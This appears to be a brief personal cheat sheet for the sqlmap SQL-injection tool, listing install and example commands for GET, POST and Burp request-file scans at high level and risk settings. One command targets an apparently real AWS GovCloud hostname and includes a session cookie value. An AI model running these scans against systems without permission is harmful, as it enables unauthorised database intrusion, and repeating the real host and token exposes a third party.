

# install

    brew install sqlmap
    

# usage

example usage

    sqlmap --user-agent "test" --url "https://example.com" --threads=4 --dbms MySQL --level=5 --risk=3 --banner --answers="union-char=Y" --keep-alive --eta -v 3


## POST

    sqlmap --user-agent "test" --url "https://example.com" --cookie="JSESSIONID=9C8352B26D684A5D1AA725628B0082EE;"  -p "userid"  --level 5 
    
sqlmap -u https://boutte-reanplatform-dockerhost-208184116.us-gov-west-1.elb.amazonaws.com/reandeploy#/home/dnow/1 --forms --batch --crawl=10 --cookie="JSESSIONID=9C8352B26D684A5D1AA725628B0082EE;" --level=5 --risk=3



## burp suite

attach post request with configuration coming from burp file
    
    ./sqlmap.py -r search-test.txt -p tfUPass